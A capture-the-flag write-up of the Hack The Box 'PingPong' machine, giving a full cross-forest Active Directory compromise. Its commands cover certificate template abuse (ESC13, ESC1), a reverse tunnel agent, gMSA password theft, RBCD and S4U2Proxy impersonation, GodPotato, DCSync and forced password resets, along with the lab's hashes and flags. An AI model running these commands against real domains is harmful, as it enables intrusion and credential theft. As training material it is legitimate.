# HTB — PingPong (Insane)

> **Rating:** Insane | **Type:** Active Directory / Multi-Forest  
> **Completed in:** ~4 days  
> **Techniques:** ESC13, ESC1, Cross-Forest DACL Abuse, gMSA Password Theft, RBCD, S4U2Proxy, Kerberoasting, GodPotato, DCSync

---

## Environment

| Host | IP | Domain | Role |
|---|---|---|---|
| dc1.ping.htb | 10.129.24.211 | ping.htb | Forest Root DC |
| dc2.pong.htb | 192.168.2.2 | pong.htb | Child/Trusted Forest DC |

**Entry Creds:** `c.roberts / AssumedBreach123`  
**Auth:** Kerberos only — NTLM disabled across both forests  
**Clock Skew:** All commands require `faketime "8+ hours"` prefix  
**Trust:** Bidirectional cross-forest trust between `ping.htb` ↔ `pong.htb`

---

## Attack Chain Overview

```
c.roberts (AssumedBreach)
  → [Phase 1]  ESC13 on TemporaryWinRM → evil-winrm shell on DC1
  → [Phase 2]  Ligolo-ng tunnel → 192.168.2.0/24 (pong.htb) reachable
  → [Phase 3]  DACL WRITE on gMSA Managers → group type abuse → read Pong_gMSA$ blob
  → [Phase 4a] Pong_gMSA$ AES key → RBCD on SVC_SQL → S4U2Proxy → C.Adam SQL sysadmin
  → [Phase 4b] xp_cmdshell → svc_sql → SeImpersonatePrivilege → GodPotato → SYSTEM on DC2
  → [Phase 4c] DCSync pong.htb → R.Martinelli AES256 key
  → [Phase 5]  Pong_gMSA$ resets R.Martinelli password → cross-forest tickets
               → R.Martinelli resets C.Carlssen password → WinRM on DC2
  → [Phase 6]  USER FLAG (C.Carlssen Desktop)
  → [Phase 7]  R.Martinelli DACL WRITE on SmartcardAuthentication → ESC1
               → certipy req as Administrator → certipy auth → DA TGT
  → [Phase 8]  ROOT FLAG (Administrator Desktop on DC1)
```

---

## Phase 1 — ESC13: Foothold on DC1

### What is ESC13?
ESC13 is an ADCS misconfiguration where a certificate template is linked to a group via `msDS-OIDToGroupLink`. Enrolling in the certificate automatically adds you to that group — even if you have no direct group membership rights. In this case, enrolling added `c.roberts` to `TempWinRMAccess`, granting WinRM access to DC1.

### Exploitation

```bash
# Get TGT
faketime "8+ hours" getTGT.py ping.htb/c.roberts:'AssumedBreach123' -dc-ip 10.129.24.211
export KRB5CCNAME=$(pwd)/c.roberts.ccache

# Request cert from ESC13 template
faketime "8+ hours" certipy-ad req -u c.roberts@ping.htb -k -no-pass \
  -target dc1.ping.htb -dc-ip 10.129.24.211 \
  -ca ping-DC1-CA -template TemporaryWinRM

# Auth with cert — get TGT
faketime "8+ hours" certipy-ad auth -pfx c.roberts.pfx -domain ping.htb -dc-ip 10.129.24.211
export KRB5CCNAME=$(pwd)/c.roberts.ccache

# Shell
faketime "8+ hours" evil-winrm -i dc1.ping.htb -r PING.HTB
```

**Result:** `evil-winrm` shell on DC1 as `c.roberts`.

---

## Phase 2 — Ligolo-ng Tunnel to pong.htb

From DC1, internal subnet `192.168.2.0/24` was discovered along with DC2 at `192.168.2.2` (dc2.pong.htb). A Ligolo-ng tunnel was established to route traffic natively without proxychains.

### Setup

```bash
# Kali — create tunnel interface
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
sudo ip route add 192.168.2.0/24 dev ligolo

# DC1 via evil-winrm — upload and connect agent
upload agent.exe C:\Temp\agent.exe
C:\Temp\agent.exe -connect <KALI_IP>:11601 -ignore-cert

# Ligolo console
session → start
```

DC2 now fully reachable natively. No proxychains required for any subsequent commands.

---

## Phase 3 — Cross-Forest DACL Abuse → gMSA Password

### Discovery

BloodHound enumeration of `pong.htb` revealed:
- `Pong_gMSA$` — a Group Managed Service Account
- `gMSA Managers` group — had `ReadGMSAPassword` rights on `Pong_gMSA$`
- `c.roberts` (ping.htb) had **DACL WRITE** on `gMSA Managers` across the forest trust

The critical obstacle: `gMSA Managers` was a **Global** group. Global groups cannot hold cross-forest members. The solution was to convert it to **Domain Local** (which can hold foreign security principals), add `c.roberts`, then read the password blob.

### Exploitation

```bash
# Set up LDAP service ticket for DC2 as c.roberts
faketime '8+ hours' getTGT.py ping.htb/c.roberts:'AssumedBreach123' -dc-ip 10.129.24.211
export KRB5CCNAME=$(pwd)/c.roberts.ccache

faketime '8+ hours' getST.py -spn 'krbtgt/PONG.HTB' -dc-ip 10.129.24.211 \
  -k -no-pass ping.htb/c.roberts
export KRB5CCNAME=$(pwd)/'c.roberts@krbtgt_PONG.HTB@PING.HTB.ccache'

faketime '8+ hours' getST.py -spn 'ldap/dc2.pong.htb' -dc-ip 192.168.2.2 \
  -k -no-pass pong.htb/c.roberts
cp 'c.roberts@ldap_dc2.pong.htb@PONG.HTB.ccache' /tmp/krb5cc_1000
export KRB5CCNAME=/tmp/krb5cc_1000

# Step 1 — Convert Global → Universal
faketime '8+ hours' bloodyAD --host dc2.pong.htb -d pong.htb \
  -u 'c.roberts@ping.htb' -k \
  set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType -v '-2147483640'

# Step 2 — Convert Universal → Domain Local
faketime '8+ hours' bloodyAD --host dc2.pong.htb -d pong.htb \
  -u 'c.roberts@ping.htb' -k \
  set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType -v '-2147483644'

# Step 3 — Add c.roberts by SID
faketime '8+ hours' bloodyAD --host dc2.pong.htb -d pong.htb \
  -u 'c.roberts@ping.htb' -k \
  add groupMember 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' \
  'S-1-5-21-750635624-2058721901-1932338391-2617'

# Get fresh tickets to bake in new group membership
faketime '8+ hours' getTGT.py ping.htb/c.roberts:'AssumedBreach123' -dc-ip 10.129.24.211
export KRB5CCNAME=$(pwd)/c.roberts.ccache
# ... repeat cross-realm ticket chain above ...

# Read the gMSA password blob
faketime '8+ hours' bloodyAD --host dc2.pong.htb -d pong.htb \
  -u 'c.roberts@ping.htb' -k \
  get object 'CN=Pong_gMSA,CN=Managed Service Accounts,DC=pong,DC=htb' \
  --attr msDS-ManagedPassword --raw
```

> **Note:** Group membership changes don't take effect in existing tickets. You must get a fresh TGT after adding c.roberts to pick up the new membership. The machine resets this periodically — if the blob comes back empty, the group was reset and the type conversion + member add needs to be redone.

### Credentials Recovered

| Account | NTLM | AES256 |
|---|---|---|
| Pong_gMSA$ | `4b85a2a049588810c1267e4018b07a07` | `5d4a1e00cb74f6979d3c9a3619743103afc1fdc61b9843043c144a8e1f664bcd` |

---

## Phase 4a — RBCD: Pong_gMSA$ → S4U2Proxy → C.Adam → SQL

### Discovery

Enumeration of `pong.htb` groups found `Database Admins` containing `C.Adam` and `P.Reiner`. Combined with `SVC_SQL` having SPN `mssqlsvc/dc2.pong.htb`, this pointed to SQL Server on DC2.

`C.Carlssen` (post-Phase 5, but discovered here) had `GenericWrite` on `SVC_SQL`, enabling RBCD. However:
- Machine account quota = 0 (can't create FAKEMACHINE$)
- Shadow credentials failed (DC2 has no CA — no PKINIT support)
- C.Carlssen had no SPN — couldn't be used as delegate-from directly

**The real path:** Use `Pong_gMSA$` itself as the RBCD principal. Write RBCD on `SVC_SQL` allowing Pong_gMSA$ to delegate, then S4U2Proxy to impersonate `C.Adam` to the SQL service.

### Exploitation

```bash
# TGT as Pong_gMSA$ using AES key
faketime '8+ hours' getTGT.py pong.htb/'Pong_gMSA$' \
  -aesKey 5d4a1e00cb74f6979d3c9a3619743103afc1fdc61b9843043c144a8e1f664bcd \
  -dc-ip 192.168.2.2
export KRB5CCNAME=$(pwd)/'Pong_gMSA$.ccache'

# Write RBCD on SVC_SQL
faketime '8+ hours' bloodyAD -d pong.htb -u 'Pong_gMSA$' \
  --host dc2.pong.htb --dc-ip 192.168.2.2 -k \
  add rbcd SVC_SQL 'Pong_gMSA$'

# S4U2Proxy — impersonate C.Adam to MSSQLSvc
faketime '8+ hours' getST.py \
  -spn 'mssqlsvc/dc2.pong.htb' \
  -impersonate C.Adam \
  -dc-ip 192.168.2.2 \
  -aesKey 5d4a1e00cb74f6979d3c9a3619743103afc1fdc61b9843043c144a8e1f664bcd \
  'pong.htb/Pong_gMSA$'

export KRB5CCNAME=$(pwd)/'C.Adam@mssqlsvc_dc2.pong.htb@PONG.HTB.ccache'

# Connect to SQL as C.Adam
faketime '8+ hours' mssqlclient.py -k -no-pass dc2.pong.htb
```

### SQL Shell

```sql
-- Confirm sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');
-- Returns: 1

-- Enable command execution
enable_xp_cmdshell

-- Confirm running context
xp_cmdshell whoami
-- Returns: pong\svc_sql

-- Check privileges
xp_cmdshell whoami /priv
-- SeImpersonatePrivilege: Enabled ← GodPotato path
```

---

## Phase 4b — GodPotato: SYSTEM on DC2

`svc_sql` had `SeImpersonatePrivilege` enabled — the classic potato attack surface. Used **GodPotato-NET4** to escalate to `NT AUTHORITY\SYSTEM`.

```bash
# Upload from Kali via C.Carlssen evil-winrm shell
# (svc_sql couldn't write to most paths — use the WinRM session instead)
upload /path/to/GodPotato-NET4.exe C:\Windows\Temp\GodPotato.exe
```

```sql
-- Execute as SYSTEM
xp_cmdshell C:\Windows\Temp\GodPotato.exe -cmd "cmd /c whoami"
-- Returns: NT AUTHORITY\SYSTEM
```

---

## Phase 4c — DCSync pong.htb → R.Martinelli AES256

From SYSTEM on DC2, DCSync'd the entire `pong.htb` domain to dump all account hashes and keys, recovering `R.Martinelli`'s AES256 key needed for Phase 7.

```bash
faketime '8+ hours' secretsdump.py -k -no-pass \
  -just-dc pong.htb/dc2\$@dc2.pong.htb \
  -dc-ip 192.168.2.2
```

---

## Phase 5 — Pivot: Pong_gMSA$ → R.Martinelli → C.Carlssen

### The Chain

`Pong_gMSA$` had `GenericWrite` / password reset rights over `R.Martinelli` in `pong.htb`.  
`R.Martinelli` had DACL write over `C.Carlssen`.  
`C.Carlssen` was a member of `Remote Management Users` on pong.htb → WinRM access.

### Exploitation

```bash
# Reset R.Martinelli's password as Pong_gMSA$
faketime '8+ hours' bloodyAD -d pong.htb -u 'Pong_gMSA$' \
  --host dc2.pong.htb --dc-ip 192.168.2.2 -k \
  set password R.Martinelli 'Password123!'

# TGT as R.Martinelli
faketime '8+ hours' getTGT.py pong.htb/R.Martinelli:'Password123!' -dc-ip 192.168.2.2
export KRB5CCNAME=$(pwd)/R.Martinelli.ccache

# Reset C.Carlssen's password as R.Martinelli
faketime '8+ hours' bloodyAD -d pong.htb -u R.Martinelli \
  --host dc2.pong.htb --dc-ip 192.168.2.2 -k \
  set password C.Carlssen 'A()DUJ!@414'

# TGT as C.Carlssen
faketime '8+ hours' getTGT.py pong.htb/c.carlssen:'A()DUJ!@414' -dc-ip 192.168.2.2
export KRB5CCNAME=$(pwd)/c.carlssen.ccache

# WinRM onto DC2
faketime '8+ hours' evil-winrm -i dc2.pong.htb -r PONG.HTB
```

---

## Phase 6 — User Flag

```powershell
type C:\Users\C.Carlssen\Desktop\user.txt
```

```
User Flag: 0a6524a10ded5a4ca094571952a9b024
```

---

## Phase 7 — ESC1: Administrator Certificate on ping.htb

### Discovery

DCSync credentials for `R.Martinelli` (from Phase 4c) enabled cross-forest enumeration of `ping.htb`. `R.Martinelli` had **DACL WRITE** (including `OWNER: WRITE` and `DACL: WRITE`) on the `SmartcardAuthentication` certificate template in `ping.htb` — confirmed via bloodyAD `get writable`.

### What is ESC1?
ESC1 is an ADCS vulnerability where `msPKI-Certificate-Name-Flag` is set to `1` (`ENROLLEE_SUPPLIES_SUBJECT`), allowing the enrollee to specify any Subject Alternative Name (UPN/SAN) in the certificate request — including impersonating any user such as Domain Administrator.

### Exploitation

```bash
# Cross-forest tickets for R.Martinelli → ping.htb
faketime '8+ hours' getST.py -spn 'krbtgt/PING.HTB' -dc-ip 192.168.2.2 \
  -k -no-pass pong.htb/R.Martinelli
export KRB5CCNAME=$(pwd)/'R.Martinelli@krbtgt_PING.HTB@PONG.HTB.ccache'

faketime '8+ hours' getST.py -spn 'ldap/dc1.ping.htb' -dc-ip 10.129.24.211 \
  -k -no-pass ping.htb/R.Martinelli
export KRB5CCNAME=$(pwd)/'R.Martinelli@ldap_dc1.ping.htb@PING.HTB.ccache'

# Step 1 — Enable ESC1: set ENROLLEE_SUPPLIES_SUBJECT flag
faketime '8+ hours' bloodyAD --host dc1.ping.htb --dc-ip 10.129.24.211 -d ping.htb \
  -u 'R.Martinelli@pong.htb' -k \
  set object 'CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' \
  msPKI-Certificate-Name-Flag -v '1'

# Step 2 — Grant c.roberts GenericAll on the template (to allow enrollment)
faketime '8+ hours' bloodyAD --host dc1.ping.htb --dc-ip 10.129.24.211 -d ping.htb \
  -u 'R.Martinelli@pong.htb' -k \
  add genericAll 'CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb' \
  'S-1-5-21-750635624-2058721901-1932338391-2617'

# Step 3 — Request cert impersonating Administrator
export KRB5CCNAME=$(pwd)/c.roberts.ccache
faketime '8+ hours' certipy-ad req -u 'C.Roberts@ping.htb' -k -no-pass \
  -dc-ip 10.129.24.211 -target dc1.ping.htb \
  -ca 'ping-DC1-CA' -template SmartcardAuthentication \
  -upn 'Administrator@ping.htb' \
  -sid 'S-1-5-21-750635624-2058721901-1932338391-500'

# Step 4 — Authenticate with cert → Administrator TGT + NT hash
faketime '8+ hours' certipy-ad auth -pfx administrator.pfx \
  -dc-ip 10.129.24.211 -domain ping.htb
# NT Hash: 63905deb12b527aadfdbc26d3f423eff
```

---

## Phase 8 — Root Flag

```bash
export KRB5CCNAME=$(pwd)/administrator.ccache
faketime '8+ hours' evil-winrm -i dc1.ping.htb -r PING.HTB
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

```
Root Flag: 7a74371cc60f10b74a4b8ab5038aeeed
```

---

## Key Credentials Reference

| Account | Domain | Credential | Type |
|---|---|---|---|
| c.roberts | ping.htb | `AssumedBreach123` | Password (entry) |
| Pong_gMSA$ | pong.htb | `4b85a2a049588810c1267e4018b07a07` | NTLM |
| Pong_gMSA$ | pong.htb | `5d4a1e00cb74f6979d3c9a3619743103afc1fdc61b9843043c144a8e1f664bcd` | AES256 |
| R.Martinelli | pong.htb | (reset during attack) | — |
| C.Carlssen | pong.htb | `A()DUJ!@414` | Password (set) |
| Administrator | ping.htb | `63905deb12b527aadfdbc26d3f423eff` | NTLM |

---

## Lessons & Techniques

- **ESC13** — certificate template linked to group membership; enrolling grants group access without direct membership rights
- **ESC1** — `ENROLLEE_SUPPLIES_SUBJECT` flag on a template allows impersonating any user via SAN; enabled here by modifying the template with DACL WRITE
- **Cross-forest DACL abuse** — foreign security principals require Domain Local groups; Global and Universal groups block cross-forest membership
- **gMSA password blob** — readable via LDAP by members of the designated readers group (`msDS-GroupMSAMembership`); parse with `gMSADumper` or bloodyAD `--raw`
- **RBCD with gMSA** — service accounts with existing SPNs can be used directly as delegate-from in RBCD without creating machine accounts
- **S4U2Proxy** — used with Pong_gMSA$'s AES key to get a valid Kerberos service ticket to SQL impersonating C.Adam
- **SeImpersonatePrivilege → GodPotato** — SQL service account running with impersonation privilege; potato family attacks escalate to SYSTEM via COM/DCOM token impersonation
- **faketime** — required throughout due to +8hr KDC clock skew; every Kerberos operation without it returns `KRB_AP_ERR_SKEW`
- **Group membership baking** — DACL changes and group additions don't take effect until a new TGT is obtained; always get fresh tickets after modifying group membership
